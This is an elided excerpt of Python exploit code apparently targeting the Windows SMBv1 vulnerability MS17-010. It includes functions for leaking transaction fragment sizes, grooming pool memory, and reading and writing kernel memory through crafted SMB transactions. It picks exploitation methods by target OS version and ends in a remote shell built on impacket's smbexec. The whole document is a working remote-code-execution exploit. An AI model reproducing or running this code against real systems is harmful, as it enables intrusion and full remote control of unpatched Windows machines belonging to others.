...
def leak_frag_size(conn, tid, fid):
    ...
    mid = conn.next_mid()
    req1 = conn.create_nt_trans_packet(5, param=pack('<HH', fid, 0), mid=mid, data='A' * 0x10d0,
...
def read_data(conn, info, read_addr, read_size):
    ...
    new_data = pack('<' + fmt * 3, info['trans2_addr'] + info['TRANS_FLINK_OFFSET'], info['trans2_addr'] + 0x200,
                    read_addr)  # OutParameter, InData, OutData
...
def align_transaction_and_leak(conn, tid, fid, info, numFill=4):
    ...
    for i in range(12):
        mid = next_extra_mid()
        reqs.append(
            conn.create_trans_packet('', mid=mid, param=trans_param,
    ...
    if leakData[0x4:0x8] != 'LStr' or leakData[info['POOL_ALIGN']:info['POOL_ALIGN'] + 2] != expected_size or leakData[
...
def exploit_matched_pairs(conn, pipe_name, info):
    ...
    # Note: Even the distance between bride transaction is exactly what we want, the groom transaction might be in a
    # wrong place.
    #       So the below operation is still dangerous. Write only 1 byte with '\x00' might be safe even alignment is
    #       wrong.
    ...
    conn.send_nt_trans_secondary(mid=fid, data='\x00',
...
def exploit_fish_barrel(conn, pipe_name, info):
    ...
    #   are allocated with RtlAllocateHeap(), the HIDWORD of InParameter is always 0. To be able to write backward
    #   with offset only,
    ...
    if info['arch'] == 'x64':
        ...
        conn.send_trans_secondary(mid=info['fid'], data='\x00' * 4,
                                  dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_INPARAM_OFFSET'] + 4)
    wait_for_request_processed(conn)
...
def exploit(target, port, pipe_name):
    ...
    if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
        ...
        info['method'] = exploit_matched_pairs
            ...
            "Windows Server 2016 ") or server_os.startswith("Windows 10") or server_os.startswith(
        "Windows RT 9200"):
        info['os'] = 'WIN8'
        info['method'] = exploit_matched_pairs
...
class RemoteShell(cmd.Cmd):
    ...
    def finish(self):
        ...
        try:
            self.__scmr = self.__rpc.get_dce_rpc('svcctl')
            self.__scmr.connect()
            self.__scmr.bind(scmr.MSRPC_UUID_SCMR)
            resp = scmr.hROpenSCManagerW(self.__scmr)
            self.__scHandle = resp['lpScHandle']
...
def shell_exec(conn):
    # based on https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
    try:
        shell = RemoteShell('C$', conn, 'SHARE', 'BTOBTO')
        shell.cmdloop()
